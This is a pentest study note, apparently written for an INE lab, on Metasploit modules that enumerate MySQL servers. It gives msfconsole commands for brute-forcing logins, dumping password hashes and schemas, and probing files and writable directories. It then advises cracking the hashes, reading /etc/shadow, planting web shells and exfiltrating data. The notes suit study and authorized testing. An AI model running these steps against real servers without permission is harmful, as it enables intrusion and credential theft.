# Metasploit - MySQL Enumeration Modules (Detailed)

## Purpose
Detailed notes for Metasploit auxiliary modules used to enumerate MySQL services.  
Use this file to detect version, find credentials, enumerate users/databases, dump hashes and schemas, and check writable directories.

## Key modules / usage
- `auxiliary/scanner/mysql/mysql_version` — detect MySQL server version.
- `auxiliary/scanner/mysql/mysql_login` — brute-force MySQL credentials.
- `auxiliary/admin/mysql/mysql_enum` — enumerate databases, users, privileges.
- `auxiliary/admin/mysql/mysql_sql` — run custom SQL queries.
- `auxiliary/scanner/mysql/mysql_file_enum` — check for files and directories.
- `auxiliary/admin/mysql/mysql_hashdump` — dump MySQL password hashes.
- `auxiliary/admin/mysql/mysql_schemadump` — dump database schema.
- `auxiliary/scanner/mysql/mysql_writable_dirs` — check for writable directories.

---

## Quick examples
Short commands to run in `msfconsole`.

```bash
# Start msfconsole
msfconsole -q

# Detect version
use auxiliary/scanner/mysql/mysql_version
set RHOSTS demo.ine.local
run

# Brute-force login
use auxiliary/scanner/mysql/mysql_login
set RHOSTS demo.ine.local
set USERNAME root
set PASS_FILE /path/to/passwords.txt
run

# Enumerate with credentials
use auxiliary/admin/mysql/mysql_enum
set RHOSTS demo.ine.local
set USERNAME root
set PASSWORD twinkle
run

# Dump hashes
use auxiliary/admin/mysql/mysql_hashdump
set RHOSTS demo.ine.local
set USERNAME root
set PASSWORD twinkle
run
```

---

## How to read common output
- `MySQL <version>` — detected server version. Use to check CVEs.
- `Login Successful` or `Success` — valid credentials found.
- `Found /path` or `is a directory` — file/directory existence.
- `Saving HashString as Loot` — hashes saved to loot for offline cracking.
- `Schema stored in: /root/.msf4/loot/...` — schema dump saved.

---

## Practical tips
- Run `mysql_version` first. Map version to advisories before aggressive actions.
- Use targeted wordlists for login brute force. Avoid high-rate brute-force on production.
- Prefer `mysql_enum` to gather users and privileges rather than blind SQL queries.
- Save all loot files and console logs. Collect timestamps and module options used.
- Do not run destructive queries unless in a lab. Follow legal and ethical rules.

---

# Module details (expanded)

## mysql_version — Detect MySQL server version

**Module**
```
auxiliary/scanner/mysql/mysql_version
```

**Purpose (short)**
Retrieve server version and protocol info.

**Important options**
- `RHOSTS`, `RPORT` (default 3306), `THREADS`.

**What it does**
- Connects to MySQL socket and reads server greeting and version.

**Typical output**
```
[+] 192.0.2.3:3306 - MySQL 5.5.61-0ubuntu0.14.04.1 (protocol 10)
```

**Interpretation**
- Use version to search for vendor advisories and CVEs.
- Older versions often have known privilege escalation or RCE vulnerabilities.

**Follow-ups**
- Run `searchsploit mysql <version>` or check NVD/CVE.
- Plan next steps based on version (patching vs exploit testing in lab).

**Remediation**
- Upgrade MySQL to supported versions and apply vendor patches.

---

## mysql_login — Brute-force MySQL credentials

**Module**
```
auxiliary/scanner/mysql/mysql_login
```

**Purpose (short)**
Attempt authentication with username/password lists.

**Important options**
- `RHOSTS`, `USERNAME` (optional), `PASS_FILE`, `USERPASS_FILE`, `THREADS`, `VERBOSE`, `STOP_ON_SUCCESS`.

**What it does**
- Tries credentials and reports success.

**Typical output**
```
[+] 192.0.2.3:3306 - Success: 'root:twinkle'
```

**Interpretation**
- Found valid credential. Access level depends on account privileges.

**Cautions**
- Brute force triggers IDS or account lockouts. Use slow rates in real environments.

**Follow-ups**
- Open a MySQL client with found credentials and inspect databases.

**Remediation**
- Enforce strong passwords, lockout policies, and monitor failed attempts.

---

## mysql_enum — Enumerate databases, users, privileges

**Module**
```
auxiliary/admin/mysql/mysql_enum
```

**Purpose (short)**
Collect server metadata, users, privileges, and some configuration settings.

**Important options**
- `RHOSTS`, `USERNAME`, `PASSWORD`, `VERBOSE`.

**What it does**
- Runs queries to list users, grants, databases, variables, and other server info.

**Typical output**
```
[+] User: root Host: localhost Password Hash: *A0E23...
[+] MySQL Version: 5.5.61...
```

**Interpretation**
- Reveals user accounts, hashes, and privileges. Identify high-privilege accounts.

**Follow-ups**
- Check `SHOW GRANTS FOR 'user'@'host';` for privilege details.
- Note accounts with `SUPER`, `GRANT OPTION`, or `FILE` privileges.

**Remediation**
- Remove or restrict unnecessary privileges. Use least privilege model.

---

## mysql_sql — Run custom SQL queries

**Module**
```
auxiliary/admin/mysql/mysql_sql
```

**Purpose (short)**
Execute arbitrary SQL statements via Metasploit module.

**Important options**
- `RHOSTS`, `USERNAME`, `PASSWORD`, `STATEMENT` (if supported).

**What it does**
- Sends provided SQL to the server and prints results.

**Typical output**
```
[*] Sending statement: 'select version()'...
[*]  | 5.5.61-0ubuntu0.14.04.1 |
```

**Interpretation**
- Use for targeted data extraction or verification.

**Cautions**
- Dangerous if used to modify data. Prefer read-only queries unless in lab.

**Follow-ups**
- Use `SHOW DATABASES;`, `SELECT ...` to inspect data. Export sensitive rows to loot files.

**Remediation**
- Limit account permissions for automated or application accounts.

---

## mysql_file_enum — Check for files and directories

**Module**
```
auxiliary/scanner/mysql/mysql_file_enum
```

**Purpose (short)**
Test for presence of common files and directories on the host filesystem accessible via SQL functions.

**Important options**
- `FILE_LIST` — wordlist of paths, `VERBOSE`, `RHOSTS`, `USERNAME`, `PASSWORD`.

**What it does**
- Uses SQL functions or file-related features to check if paths exist.

**Typical output**
```
[+] /tmp is a directory and exists
[+] /etc/passwd is a file and exists
[!] /etc/shadow does not exist
```

**Interpretation**
- Finding system files indicates high risk. Presence of `/etc/passwd` is normal; access to `/etc/shadow` is critical.

**Follow-ups**
- If readable, download or copy file contents to review in safe environment.

**Remediation**
- Restrict MySQL process permissions. Ensure file access via DB is limited.

---

## mysql_hashdump — Dump MySQL password hashes

**Module**
```
auxiliary/admin/mysql/mysql_hashdump
```

**Purpose (short)**
Extract password hash strings from the mysql.user table and save as loot.

**Important options**
- `RHOSTS`, `USERNAME`, `PASSWORD`, `OUTPUT` (loot path).

**What it does**
- Queries mysql.user for authentication strings and stores them.

**Typical output**
```
[+] Saving HashString as Loot: root:*A0E23B...
```

**Interpretation**
- Collected hashes can be cracked offline to reveal plaintext passwords.

**Follow-ups**
- Run cracking tools like John or Hashcat locally on hash files.

**Remediation**
- Use modern password hashing and rotate passwords. Limit DB access to trusted admins.

---

## mysql_schemadump — Dump database schema

**Module**
```
auxiliary/admin/mysql/mysql_schemadump
```

**Purpose (short)**
Extract database schema structure and save to loot.

**Important options**
- `RHOSTS`, `USERNAME`, `PASSWORD`, `OUTPUT`.

**What it does**
- Iterates databases and tables and saves schema information.

**Typical output**
```
[+] Schema stored in: /root/.msf4/loot/..._mysql_schema_680841.txt
```

**Interpretation**
- Schema shows where data lives. Useful to plan data-targeted extraction.

**Follow-ups**
- Inspect loot file to find sensitive table names and plan safe data checks.

**Remediation**
- Limit schema visibility, avoid giving read access to `mysql` schema for apps.

---

## mysql_writable_dirs — Check for writable directories

**Module**
```
auxiliary/scanner/mysql/mysql_writable_dirs
```

**Purpose (short)**
Identify directories where MySQL process can write files.

**Important options**
- `DIR_LIST`, `RHOSTS`, `USERNAME`, `PASSWORD`.

**What it does**
- Attempts to create files in candidate directories and reports success/failure.

**Typical output**
```
[+] /tmp is writeable
[!] Can't create/write to file '/etc/passwd/LzuBWjIb' (Errcode: 20)
```

**Interpretation**
- Writable directories can be used for persistence, file upload, or privilege escalation.

**Follow-ups**
- If writable and in webroot, consider uploading web shells only in lab environment.
- Use writable dirs to exfiltrate data to a place attacker controls if allowed.

**Remediation**
- Restrict MySQL user privileges on filesystem. Run MySQL with least privileges.

---

## INE lab example (complete scenario)

### Input
```bash
# Detect version
use auxiliary/scanner/mysql/mysql_version
set RHOSTS demo.ine.local
run

# Brute-force login
use auxiliary/scanner/mysql/mysql_login
set RHOSTS demo.ine.local
set USERNAME root
set PASS_FILE /usr/share/wordlists/unix_passwords.txt
run

# Enumerate server
use auxiliary/admin/mysql/mysql_enum
set RHOSTS demo.ine.local
set USERNAME root
set PASSWORD twinkle
run

# Check files and writable dirs
use auxiliary/scanner/mysql/mysql_file_enum
set RHOSTS demo.ine.local
set USERNAME root
set PASSWORD twinkle
set FILE_LIST /usr/share/wordlists/directory.txt
run

use auxiliary/scanner/mysql/mysql_writable_dirs
set RHOSTS demo.ine.local
set USERNAME root
set PASSWORD twinkle
set DIR_LIST /usr/share/wordlists/directory.txt
run

# Dump hashes and schema
use auxiliary/admin/mysql/mysql_hashdump
set RHOSTS demo.ine.local
set USERNAME root
set PASSWORD twinkle
run

use auxiliary/admin/mysql/mysql_schemadump
set RHOSTS demo.ine.local
set USERNAME root
set PASSWORD twinkle
run
```

### Output (aggregated example)
```
[+] 192.162.117.3:3306 - MySQL 5.5.61-0ubuntu0.14.04.1 (protocol 10)
[+] 192.162.117.3:3306 - Success: 'root:twinkle'
[+] User: root Host: localhost Password Hash: *A0E23B...
[+] /etc/passwd is a file and exists
[+] /tmp is writeable
[+] Saving HashString as Loot: root:*A0E23B...
[+] Schema stored in: /root/.msf4/loot/..._mysql_schema_680841.txt
```

### Short analysis and next steps
- Version 5.5.61 is old. Check for CVEs and apply patches.
- Found `root:twinkle`. Use this credential to inspect databases and dump sensitive tables.
- `/etc/passwd` found. If `/etc/shadow` accessible, escalate and extract hashes.
- Writable `/tmp` can be abused for persistence. If webroot writable, test web shell only in lab.
- Hashes saved to loot. Crack offline with John/Hashcat and report findings.

---

## Final checklist (report)
- [ ] Save raw module outputs and timestamps.
- [ ] Collect loot files and compute hashes for evidence.
- [ ] Note exact commands and wordlists used.
- [ ] Recommend remediation for each finding.
- [ ] Provide safe reproduction steps for reviewers.
